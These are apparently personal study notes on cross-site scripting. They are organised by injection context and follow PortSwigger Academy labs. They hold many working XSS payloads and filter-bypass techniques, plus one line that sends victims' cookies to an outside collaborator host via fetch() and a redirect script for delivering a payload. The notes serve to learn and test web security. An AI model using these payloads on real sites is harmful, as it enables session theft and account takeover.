---
sticker: emoji//2611-fe0f
---

When building payloads for stored/reflected XSS, determine **context** by:
- The **location within the response** where attacker-controllable data appears.
- **Any input validation** or other **processing** performed on that data by the application.
Check for various payloads on XSS cheatsheets:
- [Master XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) (portswigger)
- [Filter evasion cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

# Contexts:

## Text between HTML tags:
When input ends up between HTML tags as text must **introduce some new HTML tags** designed to trigger execution of JavaScript.
``` js
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### Bypassing tag/attribute filters:
1. Send query to Intruder, and add variables to test which `tags` (first) and then `attributes` (second) are filtered. E.g.:
   `<TAG %20 ATTRIBUTE=1>`
   ...e.g. resulting in `<body%20onresize=1>`
   Get these from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), and click **Copy tags/events to clipboard**. ![](attachments/77554.png)
2. Once identified which `tags`/`attributes` are accepted, filter the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) by them and test various payloads.

### Using custom tags:
Can create custom tags like `<xss></xss>` to avoid tag blacklists, and embed Javascript-enabled attributes like `onfocus=fetch()` within them to exfiltrate cookies.
To find which attributes are supported, filter the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) by `custom-tags`.

##### [Lab:](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked) Reflected XSS into HTML context with all tags blocked except custom ones
- Use [Intruder approach](XSS%20Contexts.md#Bypassing%20tag/attribute%20filters) to find what tags/attributes are allowed. If custom are allowed, attempt something like the following:
**Exfiltrate cookies (non http-only) to server** via `fetch` request with a #custom-tag
``` js
<xss onfocus=fetch(`https://eo6w14f706os8lm27hozv9lv3m9dxcl1.oastify.com/x`+document.cookie); autofocus tabindex=1>
```

``` js
/* When embedded on a page & delivered to victim */
<script> 
location = `https://0a7400c10463f01e80adfd31000600f5.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert(document.cookie)%3B+autofocus+tabindex%3D1%3E`
</script>
```

### [Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed): SVG tag manipulation
#svg #animate
- Test which `tags` + `events` are allowed with intruder, using:   ![](attachments/2860.png)
- All payloads caused a `400` response, except for the ones using the `<svg>`, `<animatetransform>`, `<title>` & `<image>` tags, and the `onbegin` event. Constructing a payload (using filters on [XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) based on these, yields: `<svg><animatetransform onbegin=alert(1) attributeName=transform>`

### [Lab:](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked) Reflected XSS with event handlers and `href` attributes blocked.
#animate #custom-attribute #nested-tag #svg

**TLDR:** to control and add custom attributes to parent elements when they are otherwise filtered, make use of the `svg` [`<animate>` (see docs here) ](https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/animate) element, and its `<animate attributeName="href" values="javascript:alert(1)"/>` functionality.
e.g. 
``` js
<a><animate attributeName="href" values="x"/></a>
// turns into...
<a href="x"></a>
```

 **Objective**: inject a vector that, when clicked, calls the alert function. 
 - Test which `tags` + `events` are allowed with intruder. 

**Allowed:**
- **Tags:** `a`, `animate`, `image`, `svg`, `title`
- **Events:** ALL BLOCKED
- `href=""` --> blocked
Needs to be in type: `<a> Click me! </a>`

Will accept nested tags. To write text: `<svg><a><text x=20 y=20>Click me!</text></a></svg>`
![](attachments/Screenshot%202026-03-25%20at%208.45.47%20pm.png)
Now as we can't use `href=""` directly, we need to look for an alternative vector to run javascript when our `<a>` tag is clicked. 

However, the `svg` `<animate>` element is supported (seen through fuzzing), which can **add custom attributes to nested/parent elements**. We can thus use it to add a `href` attribute to the `<a>` tag.

E.g. the below code will add `rx="0;5;0"` as an attribute to `<rect width="10" height="10">`:
![](attachments/84045.png)
...Turning it into: 
`<rect width="10" height="10" rx="0;5;0">`.

Thus, can add the `href` to `<a>` to complete the XSS with:
``` js
<svg>
  <a>
	<animate attributeName="href" values="javascript:alert(1)"/>
	<text x=20 y=20>Click me!</text>
  </a>
</svg>
```
![](attachments/38686.png)

---

## XSS within HTML tag attributes
#encoded #html-tag-attribute #event-handler
May be able to terminate attribute value, close the tag, and begin a new one (usually with `"><script>alert...`).
`"><script>alert(document.domain)</script>`

Where angle brackets are **blocked/encoded**, if you can:
1. Break out (with a single/double quote)
2. Introduce a new attribute that **creates a scriptable context** (such as an **event handler**). 
   E.g.`" onfocus=alert(1) ` - space at the end very important. Try #payload variants like:
- `" onmouseover='alert(1)'`
- `" onmouseover=alert(1)`
- `" onmouseover=alert(1) "`

For example: `" autofocus onfocus=alert(document.domain) x="`
... creates an `onfocus` event that **executes when the element receives focus**, which is auto-triggered by an `autofocus` attribute.

#### [Lab:](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded) Reflected XSS into attribute with angle brackets HTML-encoded

WHen inside a tag, like `value="[INPUT HERE]"`:
![](attachments/64877.png)
... can break out with `" onmouseover=alert(1)"` or `" autofocus onfocus=alert(document.domain) x="` :
![](attachments/23185.png)



#### [Lab:](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded) Stored XSS into anchor `href` attribute with double quotes HTML-encoded
#href
Sometimes, context of reflected input is **within attributes that can create scriptable contexts themselves** (like `href` with `javascript:` pseudo-protocol). In this case, can directly inject the `javascript:alert(1)` #payload etc.

`<a href="javascript:alert(document.domain)">`
By entering unique strings into each input box (entry point), can see where they exit within the DOM:
![](attachments/Screenshot%202026-03-25%20at%209.47.36%20pm.png)
Can see that the `Website:` field is injected into the `href="x"` attribute. Can potentially use this to execute `javascript:` pseudo-protocol & perform XSS.
![](attachments/69054.png)
By submitting the following in the `Website:` input:
`javascript:alert(document.domain) `
![](attachments/84091.png)


### Lab: [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
*NOTE: somewhat obscure, [based on research here](https://portswigger.net/research/xss-in-hidden-input-fields).*
1. Formulate & **inject arbitrary query strings into the URL**, and **see whether they are reflected into the DOM**, and if so, where. E.g. `https://site.com/?yugdsjhs`
   Here, it;s reflected into a `canonical` link tag: ![](attachments/94267.png)
2. Attempt to break out of tag & attempt to insert a new element. However, as this is inside the `<head>` element, we cannot click on this directly, unless we use **access keys** - which will simulate the click with a key combo like `ALT+SHIFT+X`, etc. ![](attachments/Screenshot%202026-03-25%20at%2010.11.15%20pm.png)
3. So, to finalise: at end of URL, specify the access key to trigger the event listener with: `...site.net/?'accesskey='x'onclick='alert(1)`
   
**Note:** Canonical link tags are defined with the [`rel` attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel), which **defines the relationship between a linked resource and the current document**. So `rel="canonical"` specifies the preferred URL for the current document.
`<link rel="canonical" accesskey="X" onclick="alert(1)" />`
#payload #canonical-link

---

## XSS into JavaScript
As the browser **first performs HTML parsing** (identifying page elements & script blocks) and only ***later* parses the content inside of them** to **understand and execute the embedded scripts**. Thus, even if malformed scripts are created after breaking out, they **will not prevent subsequent scripts from being parsed**.

### Summary of techniques:
- **Terminating scripts:** `</script><script>alert(1)</script>`
- **Injecting into string literals `x=''`:**
	- `' -command- '`
	- **Adding another clause with `';`:** `';command//`.
- **Backslash escaping**, e.g. adding `\'` --> `\\'` *(if result is `\\\'`, will likely not work)*
- Using **exception handlers (`onerror`) and passing parameters without parenthesis with `throw`**
- **Using HTML entities/decoding**: `'` --> `&apos;`
- Using `${....}` to execute JS within **template literals** (``` `backticked expressions` ```)


### Terminating Existing Scripts:
Try and escape script tags (using `</script>`) around existing JavaScript, and introduce new HTML tags to execute your own.
**E.g. for:** 
``` js
<script>
var input = 'input-here'
</script>
```
Can insert something like the following #payload to break into a new script tag, even when **`'` and `/` are escaped.**:
- `</script><img src=1 onerror=alert(document.domain)>`
![](attachments/71694.png)


### Breaking out of string literals `x=''`
#angle-bracket-encoding
Where XSS context is inside a quoted string literal `x=''`, can break out with `'`, but **must repair the string or the script won't execute.** 

You can inject javascript into a string literal with 
`' -command- '`, or add another clause with `';command//`.
![](attachments/41758.png)
**A #payload might be:**
- `'-alert(document.domain)-'`
- `' + alert(document.domain) + '`
- `';alert(document.domain)//`

#### Backslash `/` escaping
However, some applications try and **escape `'` with backslashes (`/`)**, to tell the parser to **interpret the following character LITERALLY instead of as a special character (e.g. string terminators)**. 
#escaping-characters #string-terminator
However, **developers can forget to escape the backslash itself**, and we can add an extra `\` to neutralise the escaping. 

**For example:**
- if `';alert(1)//` --> *`\';alert(1)//`*
	... add `\` to input to make:
- `\';alert(1)//` --> *`\\';alert(1)//`* (second *`\`* is escaped by the first `\` added by the app and is thus interpreted **literally**, so the **following `'`** is interpreted as a **string terminator**)

If there is a difference between backslash numbers, i.e:
- you input **`\'`**, JS code returns `\\\'`
... the application is **escaping backslashes properly**, and likely can't get around it.
![](attachments/6049.png)
#### TLDR: escaping string literals
- **A `\` before a character means the subsequent character is treated literally, instead of as a special character.** Use combinations of `'` and `\` to **break escaping techniques** (e.g. sneaking in a `'` by escaping the backslash, with `\'` --> `\\'` )

### Restricting allowed characters - `onerror` & `throw`.
Certain characters, like `();`, may be restricted, whether via a WAF or site itself. Must instead **experiment with other ways of calling** functions - see [research & methods here](https://portswigger.net/research/xss-without-parentheses-and-semi-colons).

One way is **assigning `alert()/eval()` statements to the global exception handler** (`onerror`), then **using `throw**` to pass arguments to them without parenthesis.** E.g.
- `onerror=alert;throw 1` --> `alert(1)`

Could also use `eval` as the exception handler and evaluate passed strings by prefixing them with **=**.
- e.g. the #payload `<script>{onerror=eval}throw'=alert\x281337\x29'</script>` will result in `Uncaught=alert(1337)` sent to `eval`.

**Visual Example:**
e.g. `<script>throw onerror=alert,'some string',123,'haha'</script>`
![](attachments/53670.png)
![](attachments/XSS%20Contexts.png)
#payload

#### [Lab:](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked) Reflected XSS in a JavaScript URL with some characters blocked

- When changing the `postID`, notice that it is passed directly into the Javascript in the DOM. However, it results in an `Invalid PostID` if it's not a number. Thus, need to add any injected script with the `&` character, specifying a seperate query. ![](attachments/17539.png)

**Final payload:**
```js
https://site.net/post?postId=5&'
},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
... **injects as:**
![](attachments/20903.png)

``` javascript
javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')
```


### Leveraging HTML-decoding to bypass fiilters
Can sometimes avoid input filters by `HTML`-encoding specific characters. Browsers will often **perform HTML-decoding of tag attribute values** BEFORE **interpreting the Javascript**, so can inject desired characters (like `'`) as their HTML-entity equivalents (`&apos;`), bypassing filters.

E.g. `&apos;-alert(1)-&apos;` --> `'-alert(1)-'`

- Single quotes are escaped, and properly done (adding one `\` results in `\\\`)
![](attachments/8721.png)![917](attachments/Screenshot%202026-03-26%20at%208.28.45%20pm.png)
- However, `&apos;` is accepted and decodes to `'`. Thus, can inject something like: `&apos; + alert(1) + &apos;`, --> `' + alert(1) + '`
![](attachments/67250.png)


### XSS in JavaScript template literals
#string-literal #template-literal #backticks
**String Literals:** strings enclosed in single/double quotes
**Template literals:** string literals **enclosed by backticks** that allow **embedded Javascript expressions**. 

Template literals prevent having to break out of the string every time you want to include a variable. 
E.g. `"Hello," + userName + " how are you?"`, can use:
``` js
`Hello, ${userName} how are you?`
```

Inside **template literals**, simply use the `${...}` syntax to embed a JavaScript expression, that will be executed when the literal is processed. E.g. a #payload:
- `${alert(document.domain)}`
![](attachments/79295.png)

---

## [Client-side template injection XSS](Client-side%20template%20injection%20XSS.md)
When apps use a client-side template frameworks (e.g. AngularJS) to dynamically render web pages, & embed user input into template expressions, can try and [inject malicious template expressions to execute JS](Client-side%20template%20injection%20XSS.md).
